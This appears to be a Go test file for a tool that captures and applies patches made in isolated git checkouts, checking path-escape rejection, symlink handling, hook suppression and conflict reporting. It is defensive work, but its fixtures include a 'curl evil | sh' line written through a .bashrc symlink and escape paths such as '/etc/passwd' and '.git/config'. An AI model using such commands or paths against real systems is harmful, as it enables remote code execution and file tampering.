package worktree

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"herdr-dots/internal/platform"
)

// draftT snapshots repo, lets edit change the checkout like a dot would, and
// captures the patch. The fourth result is the diff bytes, which is what the
// engine hands to Apply after patchstore has verified their hash.
func draftT(t *testing.T, g Git, repo string, edit func(dir string)) (Snapshot, Checkout, Patch, []byte) {
	t.Helper()
	s := snapshotT(t, g, repo)
	co := checkoutT(t, g, s)
	edit(co.Dir)
	p, err := Capture(context.Background(), g, co, s)
	if err != nil {
		t.Fatal(err)
	}
	return s, co, p, p.Diff
}

func TestCaptureReturnsOnlyTheDotsChanges(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	writeFile(t, filepath.Join(repo, "a.txt"), "user edit\n") // the baseline, not the dot's change
	_, co, p, _ := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "b.txt"), "b\nfixed\n")
		writeFile(t, filepath.Join(dir, "src", "new.go"), "package src\n")
		writeFile(t, filepath.Join(dir, "img.bin"), "\x00\x01\x02binary")
		if err := os.Remove(filepath.Join(dir, "c.txt")); err != nil {
			t.Fatal(err)
		}
	})
	paths := p.Paths()
	slices.Sort(paths)
	if want := []string{"b.txt", "c.txt", "img.bin", "src/new.go"}; !slices.Equal(paths, want) {
		t.Fatalf("paths %v, want %v", paths, want)
	}
	if p.Stat != "4 files +2 −1" || p.Files != 4 || p.Bytes != len(p.Diff) {
		t.Fatalf("stat %q files %d bytes %d", p.Stat, p.Files, p.Bytes)
	}
	if !slices.Contains(p.Flags, FlagBinary) {
		t.Fatalf("flags %v, want binary", p.Flags)
	}
	if strings.Contains(string(p.Diff), "user edit") {
		t.Fatal("the user's own uncommitted change leaked into the patch")
	}
	if err := Validate(p, co.Dir, Caps{MaxBytes: 200000, MaxFiles: 50}); err != nil {
		t.Fatalf("Validate: %v", err)
	}
}

func TestCaptureFlagsAModeChange(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("no executable bit on Windows")
	}
	g := isoGit(t)
	_, _, p, _ := draftT(t, g, newRepo(t), func(dir string) {
		if err := os.Chmod(filepath.Join(dir, "b.txt"), 0o755); err != nil {
			t.Fatal(err)
		}
	})
	if !slices.Contains(p.Flags, FlagMode) || p.Stat != "1 file +0 −0" {
		t.Fatalf("flags %v stat %q", p.Flags, p.Stat)
	}
}

func TestEmptyDraftIsErrEmptyPatch(t *testing.T) {
	g := isoGit(t)
	_, co, p, _ := draftT(t, g, newRepo(t), func(string) {})
	if err := Validate(p, co.Dir, Caps{}); !errors.Is(err, ErrEmptyPatch) {
		t.Fatalf("err %v, want ErrEmptyPatch", err)
	}
}

func TestValidateEnforcesCaps(t *testing.T) {
	g := isoGit(t)
	_, co, p, _ := draftT(t, g, newRepo(t), func(dir string) {
		writeFile(t, filepath.Join(dir, "x.txt"), strings.Repeat("line\n", 100))
		writeFile(t, filepath.Join(dir, "y.txt"), "y\n")
	})
	if err := Validate(p, co.Dir, Caps{MaxFiles: 1}); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("files cap: %v", err)
	}
	if err := Validate(p, co.Dir, Caps{MaxBytes: 100}); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("bytes cap: %v", err)
	}
}

func TestValidateRejectsGitDirsEscapesAndSubmodules(t *testing.T) {
	ok := []byte("diff")
	for path, want := range map[string]error{
		".git/config":      ErrGitDir,
		"sub/.GIT/hooks/x": ErrGitDir,
		".git./config":     ErrGitDir,
		"GIT~1/config":     ErrGitDir,
		"../outside.txt":   ErrEscape,
		"a/../../x":        ErrEscape,
		"/etc/passwd":      ErrEscape,
		"C:/Windows/x":     ErrEscape,
		`a\b`:              ErrEscape,
		"a\x1b[31m":        ErrEscape,
	} {
		p := Patch{Diff: ok, Files: 1, Bytes: 4, Changes: []Change{{Path: path, Status: "M", OldMode: "100644", NewMode: "100644"}}}
		if err := Validate(p, t.TempDir(), Caps{}); !errors.Is(err, want) {
			t.Errorf("%q: err %v, want %v", path, err, want)
		}
	}
	// Windows-reserved names are refused where platform.ReservedPathName says
	// so (Windows); on Unix they are ordinary files.
	for _, path := range []string{"con.txt", "src/aux.c", "a.txt:stream"} {
		p := Patch{Diff: ok, Files: 1, Bytes: 4, Changes: []Change{{Path: path, Status: "M", OldMode: "100644", NewMode: "100644"}}}
		err := Validate(p, t.TempDir(), Caps{})
		if refused := errors.Is(err, ErrEscape); refused != platform.ReservedPathName(path) {
			t.Errorf("%q: err %v, want refused=%v", path, err, platform.ReservedPathName(path))
		}
	}
	sub := Patch{Diff: ok, Files: 1, Bytes: 4, Changes: []Change{{Path: "vendor/lib", Status: "M", OldMode: "160000", NewMode: "160000"}}}
	if err := Validate(sub, t.TempDir(), Caps{}); !errors.Is(err, ErrEscape) {
		t.Errorf("submodule: %v", err)
	}
}

func TestANewSymlinkPointingOutsideIsRejected(t *testing.T) {
	g := isoGit(t)
	var evil, fine string
	_, co, p, _ := draftT(t, g, newRepo(t), func(dir string) {
		evil, fine = filepath.Join(dir, "evil"), filepath.Join(dir, "fine")
		symlinkOrSkip(t, "/etc/passwd", evil)
		symlinkOrSkip(t, "a.txt", fine)
	})
	if !slices.Contains(p.Flags, FlagSymlink) {
		t.Fatalf("flags %v", p.Flags)
	}
	if err := Validate(p, co.Dir, Caps{}); !errors.Is(err, ErrEscape) || !strings.Contains(err.Error(), "evil") {
		t.Fatalf("err %v, want ErrEscape naming evil", err)
	}
	if err := os.Remove(evil); err != nil {
		t.Fatal(err)
	}
	p2, err := Capture(context.Background(), g, co, Snapshot{Commit: sh(t, co.Dir, "rev-parse", "HEAD")})
	if err != nil {
		t.Fatal(err)
	}
	if err := Validate(p2, co.Dir, Caps{}); err != nil {
		t.Fatalf("an in-repo symlink is allowed: %v", err)
	}
}

func TestWritingThroughAnEscapingSymlinkNeverReachesOutside(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	outside := t.TempDir()
	writeFile(t, filepath.Join(outside, ".bashrc"), "original\n")
	symlinkOrSkip(t, filepath.Join(outside, ".bashrc"), filepath.Join(repo, "rc"))
	sh(t, repo, "add", "rc")
	sh(t, repo, "commit", "-qm", "link")
	s := snapshotT(t, g, repo)
	co := checkoutT(t, g, s)
	if _, ok := co.Defanged["rc"]; !ok {
		t.Skip("this git checks symlinks out as plain files (core.symlinks=false)")
	}
	// A tool that follows links would write the target; the stand-in is a
	// plain file, so the write stays in the worktree.
	writeFile(t, filepath.Join(co.Dir, "rc"), "curl evil | sh\n")
	writeFile(t, filepath.Join(co.Dir, "b.txt"), "real change\n")
	p, err := Capture(context.Background(), g, co, s)
	if err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, filepath.Join(outside, ".bashrc")); got != "original\n" {
		t.Fatalf("the file outside changed: %q", got)
	}
	if paths := p.Paths(); !slices.Equal(paths, []string{"b.txt"}) {
		t.Fatalf("paths %v: the symlink must come back unchanged", paths)
	}
	if !slices.Contains(p.Flags, FlagSymlinkKept) {
		t.Fatalf("flags %v, want symlink-kept", p.Flags)
	}
	if fi, err := os.Lstat(filepath.Join(co.Dir, "rc")); err != nil || fi.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("the symlink was not restored: %v %v", fi, err)
	}
}

func TestApplyTouchesOnlyTheWorkingTree(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	writeFile(t, filepath.Join(repo, "c.txt"), "c staged\n")
	sh(t, repo, "add", "c.txt")
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "b.txt"), "b fixed\n")
		writeFile(t, filepath.Join(dir, "new.txt"), "new\n")
	})
	before := stateOf(t, repo)
	conflicts, err := Apply(context.Background(), g, repo, patch, p.Paths())
	if err != nil || len(conflicts) != 0 {
		t.Fatalf("Apply = %v, %v", conflicts, err)
	}
	after := stateOf(t, repo)
	if after.index != before.index || after.head != before.head || after.refs != before.refs || after.stash != before.stash {
		t.Fatal("Apply changed the index, HEAD, refs or stash")
	}
	if readFile(t, filepath.Join(repo, "b.txt")) != "b fixed\n" || readFile(t, filepath.Join(repo, "new.txt")) != "new\n" {
		t.Fatal("the patch was not applied to the working tree")
	}
	staged := sh(t, repo, "diff", "--cached", "--name-only")
	unstaged := sh(t, repo, "diff", "--name-only")
	untracked := sh(t, repo, "ls-files", "--others", "--exclude-standard")
	if staged != "c.txt" || unstaged != "b.txt" || untracked != "new.txt" {
		t.Fatalf("staged %q unstaged %q untracked %q: staged stays staged and nothing new is staged", staged, unstaged, untracked)
	}
}

func TestApplyMergesWhenTheWorkingTreeMoved(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "a.txt"), "1\nTWO\n3\n4\n5\n6\n7\n8\n9\n10\n")
	})
	writeFile(t, filepath.Join(repo, "a.txt"), "1\n2\n3\n4\n5\n6\n7\n8\nNINE\n10\n") // the agent kept editing
	conflicts, err := Apply(context.Background(), g, repo, patch, p.Paths())
	if err != nil || len(conflicts) != 0 {
		t.Fatalf("Apply = %v, %v", conflicts, err)
	}
	if got := readFile(t, filepath.Join(repo, "a.txt")); got != "1\nTWO\n3\n4\n5\n6\n7\n8\nNINE\n10\n" {
		t.Fatalf("merged a.txt = %q", got)
	}
}

func TestApplyReportsConflictsWithoutStaging(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "a.txt"), "1\nTWO\n3\n4\n5\n6\n7\n8\n9\n10\n")
	})
	writeFile(t, filepath.Join(repo, "a.txt"), "1\nDEUX\n3\n4\n5\n6\n7\n8\n9\n10\n")
	before := stateOf(t, repo)
	conflicts, err := Apply(context.Background(), g, repo, patch, p.Paths())
	if err != nil || !slices.Equal(conflicts, []string{"a.txt"}) {
		t.Fatalf("Apply = %v, %v; want conflicts [a.txt]", conflicts, err)
	}
	if got := readFile(t, filepath.Join(repo, "a.txt")); !strings.Contains(got, "<<<<<<<") || !strings.Contains(got, "TWO") || !strings.Contains(got, "DEUX") {
		t.Fatalf("a.txt = %q, want conflict markers with both sides", got)
	}
	if after := stateOf(t, repo); after.index != before.index || sh(t, repo, "ls-files", "-u") != "" {
		t.Fatal("conflicts must never reach the user's index")
	}
}

func TestApplyNeverSilentlyOverwritesAFileTheUserCreated(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "new.txt"), "from the dot\n")
	})
	writeFile(t, filepath.Join(repo, "new.txt"), "the user's own file\n")
	conflicts, err := Apply(context.Background(), g, repo, patch, p.Paths())
	if err != nil || !slices.Equal(conflicts, []string{"new.txt"}) {
		t.Fatalf("Apply = %v, %v; want a conflict on new.txt", conflicts, err)
	}
	if got := readFile(t, filepath.Join(repo, "new.txt")); !strings.Contains(got, "the user's own file") || !strings.Contains(got, "from the dot") {
		t.Fatalf("new.txt = %q, want both versions inside conflict markers", got)
	}
}

func TestApplyIsAllOrNothingOnAHardFailure(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "b.txt"), "b fixed\n")
		writeFile(t, filepath.Join(dir, "new.txt"), "from the dot\n")
	})
	if err := os.Remove(filepath.Join(repo, "b.txt")); err != nil { // the user deleted the file the patch edits
		t.Fatal(err)
	}
	if _, err := Apply(context.Background(), g, repo, patch, p.Paths()); err == nil {
		t.Fatal("editing a file the user deleted must fail")
	}
	if _, err := os.Stat(filepath.Join(repo, "new.txt")); !os.IsNotExist(err) {
		t.Fatal("a failed apply still created new.txt")
	}
}

func TestHooksNeverRunDuringCaptureAndApply(t *testing.T) {
	g := isoGit(t)
	repo := newRepo(t)
	marker := installMarkerHooks(t, repo)
	_, _, p, patch := draftT(t, g, repo, func(dir string) {
		writeFile(t, filepath.Join(dir, "b.txt"), "b fixed\n")
	})
	if _, err := Apply(context.Background(), g, repo, patch, p.Paths()); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(marker); err == nil {
		t.Fatalf("a hook ran: %s", b)
	}
}

func TestStat(t *testing.T) {
	if got := Stat(1, 3, 0); got != "1 file +3 −0" {
		t.Fatal(got)
	}
	if got := Stat(12, 42, 7); got != "12 files +42 −7" {
		t.Fatal(got)
	}
}
